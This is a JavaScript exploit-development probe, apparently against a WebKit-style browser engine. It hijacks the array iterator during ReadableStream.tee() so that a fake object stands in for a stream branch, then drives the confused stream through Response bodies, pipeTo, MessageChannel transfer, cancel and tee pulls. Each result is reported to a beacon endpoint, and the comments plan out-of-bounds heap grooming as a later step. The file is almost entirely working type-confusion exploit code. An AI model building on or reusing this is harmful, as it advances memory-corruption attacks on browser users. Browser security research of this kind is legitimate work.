/*
 * p433b -- Substituted stream consumption: test C++ paths
 *
 * V432 confirmed: teeSub() creates a real ReadableStream wrapping
 * our fake object. getReader() crashes (missing private slots).
 *
 * But OTHER consumers may use different code paths:
 * - Response(stream).text() -> FetchBody consumption
 * - Response(stream).arrayBuffer()
 * - stream.pipeTo(writable) -> pipe algorithm
 * - structuredClone with transfer
 * - new Request(url, {body: stream})
 *
 * NON-CRASHING tests first (substitution), OOB grooming last.
 *
 * Beacon prefix: V433B-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V433B-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function teeSub(fakeObj) {
  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("hello");
      controller.close();
    }
  });

  var intercepted = false;
  var realBranch2 = null;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        realBranch2 = self[1]; // capture real branch2
        var items = [self[0], fakeObj];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return {branches: branches, realBranch2: realBranch2};
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }
}

// ================================================================
// Test A: Response(confusedStream).text()
// Response body consumption uses FetchBodyConsumer in C++
// ================================================================

function testA() {
  B("A-START");

  var fake = {_marker: "V433B-FAKE-A"};
  var res = teeSub(fake);
  if (!res) { B("A-TEE-FAIL"); return; }

  var confused = res.branches[1];
  B("A-TEE-OK", {
    isRS: confused instanceof ReadableStream,
    locked: false // we know this works from V432
  });

  try {
    var resp = new Response(confused);
    B("A-RESPONSE-CREATED", {
      status: resp.status,
      type: resp.type,
      bodyUsed: resp.bodyUsed
    });

    resp.text().then(function(text) {
      B("A-TEXT-OK", {len: text.length, preview: text.slice(0, 80)});
    }).catch(function(e) {
      B("A-TEXT-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("A-RESPONSE-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test B: Response(confusedStream).arrayBuffer()
// ================================================================

function testB() {
  B("B-START");

  var targetAB = new ArrayBuffer(64);
  var view = new Uint32Array(targetAB);
  for (var i = 0; i < view.length; i++) view[i] = 0xBB000000 + i;

  var res = teeSub(targetAB);
  if (!res) { B("B-TEE-FAIL"); return; }

  var confused = res.branches[1];
  B("B-TEE-OK", confused instanceof ReadableStream);

  try {
    var resp = new Response(confused);
    B("B-RESP-CREATED");

    resp.arrayBuffer().then(function(ab) {
      var v = new Uint8Array(ab);
      B("B-AB-OK", {len: ab.byteLength, first16: Array.from(v.slice(0, 16))});
    }).catch(function(e) {
      B("B-AB-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("B-RESP-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test C: confusedStream.pipeTo(writable)
// pipeTo goes through readableStreamPipeTo JS builtin
// ================================================================

function testC() {
  B("C-START");

  var chunks = [];
  var ws = new WritableStream({
    write: function(chunk) {
      chunks.push(chunk);
      B("C-CHUNK", {type: typeof chunk, val: String(chunk).slice(0, 40)});
    },
    close: function() {
      B("C-WS-CLOSE", chunks.length);
    }
  });

  var fake = {_marker: "V433B-PIPE"};
  var res = teeSub(fake);
  if (!res) { B("C-TEE-FAIL"); return; }

  var confused = res.branches[1];
  B("C-TEE-OK");

  try {
    confused.pipeTo(ws).then(function() {
      B("C-PIPE-DONE", chunks.length);
    }).catch(function(e) {
      B("C-PIPE-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("C-PIPE-EXCEPT", e.message.slice(0, 80));
  }
}

// ================================================================
// Test D: structuredClone with transfer
// ReadableStream is transferable; transfer reads InternalReadableStream
// ================================================================

function testD() {
  B("D-START");

  var fake = {_marker: "V433B-CLONE"};
  var res = teeSub(fake);
  if (!res) { B("D-TEE-FAIL"); return; }

  var confused = res.branches[1];
  B("D-TEE-OK");

  // Try transferring the confused stream via MessageChannel
  try {
    var mc = new MessageChannel();
    mc.port2.onmessage = function(ev) {
      B("D-RECEIVED", {
        type: typeof ev.data,
        isRS: ev.data instanceof ReadableStream,
        locked: ev.data ? ev.data.locked : "null"
      });

      // Try to read from the transferred stream
      if (ev.data instanceof ReadableStream) {
        try {
          var reader = ev.data.getReader();
          B("D-READER-OK");
          reader.read().then(function(r) {
            B("D-READ-OK", {done: r.done, val: String(r.value).slice(0, 40)});
          }).catch(function(e) {
            B("D-READ-ERR", e.message.slice(0, 80));
          });
        } catch(e) {
          B("D-READER-ERR", e.message.slice(0, 80));
        }
      }
    };

    mc.port1.postMessage(confused, [confused]);
    B("D-POSTED");
  } catch(e) {
    B("D-TRANSFER-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test E: Cancel the confused stream
// cancel() goes through InternalReadableStream::cancel() in C++
// which calls readableStreamCancel JS builtin, but the globalObject
// is real (from DOMGuarded construction, not from our fake object)
// ================================================================

function testE() {
  B("E-START");

  var fake = {_marker: "V433B-CANCEL"};
  var res = teeSub(fake);
  if (!res) { B("E-TEE-FAIL"); return; }

  var confused = res.branches[1];
  B("E-TEE-OK");

  try {
    confused.cancel("test-cancel").then(function() {
      B("E-CANCEL-OK");
    }).catch(function(e) {
      B("E-CANCEL-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("E-CANCEL-EXCEPT", e.message.slice(0, 80));
  }
}

// ================================================================
// Test F: Hold both real and confused branches, read from real
// The tee pull function enqueues to real branch2 via closures.
// We hold realBranch2 from the interceptor. Can we get a reader on it?
// ================================================================

function testF() {
  B("F-START");

  var fake = {_marker: "V433B-HOLD"};
  var res = teeSub(fake);
  if (!res) { B("F-TEE-FAIL"); return; }

  var confused = res.branches[1];
  var real = res.realBranch2;

  B("F-TEE-OK", {
    confusedIsRS: confused instanceof ReadableStream,
    realType: typeof real,
    realCtor: real ? (real.constructor ? real.constructor.name : "?") : "null"
  });

  // The real branch2 is an InternalReadableStream JS object (plain object with private slots)
  // It's NOT a ReadableStream wrapper -- it's the raw internal
  // Can we enumerate its properties?
  if (real) {
    try {
      var names = Object.getOwnPropertyNames(real);
      B("F-REAL-NAMES", names.slice(0, 20));
    } catch(e) {
      B("F-REAL-NAMES-ERR", e.message.slice(0, 60));
    }

    // Try accessing known internal properties (won't work because they're private names)
    try {
      B("F-REAL-PROPS", {
        state: real.state,
        reader: real.reader,
        controller: real.readableStreamController,
        keys: Object.keys(real).slice(0, 10)
      });
    } catch(e) {
      B("F-REAL-PROPS-ERR", e.message.slice(0, 60));
    }

    // What if we wrap the real internal in a new ReadableStream ourselves?
    // ReadableStream constructor expects an underlying source, not an InternalReadableStream
    // But what if we pass it to APIs that expect InternalReadableStream?

    // Try: is the real internal iterable?
    try {
      var iter = real[Symbol.iterator];
      B("F-REAL-ITER", typeof iter);
    } catch(e) {
      B("F-REAL-ITER-ERR", e.message.slice(0, 60));
    }

    // Try: does it have Symbol.asyncIterator?
    try {
      var aiter = real[Symbol.asyncIterator];
      B("F-REAL-AITER", typeof aiter);
    } catch(e) {
      B("F-REAL-AITER-ERR", e.message.slice(0, 60));
    }
  }
}

// ================================================================
// Test G: Read from branch0 (real branch1) to trigger tee pull
// which enqueues data to the REAL branch2 we hold from Test F
// ================================================================

function testG() {
  B("G-START");

  var fake = {_marker: "V433B-PULL"};
  var res = teeSub(fake);
  if (!res) { B("G-TEE-FAIL"); return; }

  var branch0 = res.branches[0]; // real branch1 wrapped as ReadableStream
  var confused = res.branches[1];
  var realB2 = res.realBranch2;

  B("G-SETUP", {
    b0isRS: branch0 instanceof ReadableStream,
    b1isRS: confused instanceof ReadableStream,
    hasRealB2: !!realB2
  });

  // Read from branch0 to trigger pull, which enqueues to real branch2
  try {
    var reader = branch0.getReader();
    B("G-READER-OK");

    reader.read().then(function(r) {
      B("G-READ-0", {done: r.done, val: String(r.value).slice(0, 40)});

      // After pull, the real branch2 should have data enqueued to it
      // But we can't read it directly (no JS access to private slots)
      // Check if the real branch2 object has changed at all
      if (realB2) {
        var names2 = [];
        try { names2 = Object.getOwnPropertyNames(realB2); } catch(e) {}
        B("G-REALB2-AFTER", names2.slice(0, 20));
      }

      return reader.read();
    }).then(function(r) {
      B("G-READ-1", {done: r.done, val: r.value ? String(r.value).slice(0, 40) : "undef"});
    }).catch(function(e) {
      B("G-READ-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("G-READER-EXCEPT", e.message.slice(0, 80));
  }
}

testA();
setTimeout(function() { testB(); }, 200);
setTimeout(function() { testC(); }, 400);
setTimeout(function() { testD(); }, 600);
setTimeout(function() { testE(); }, 800);
setTimeout(function() { testF(); }, 1000);
setTimeout(function() { testG(); }, 1200);
setTimeout(function() { B("DONE"); }, 3000);
})();
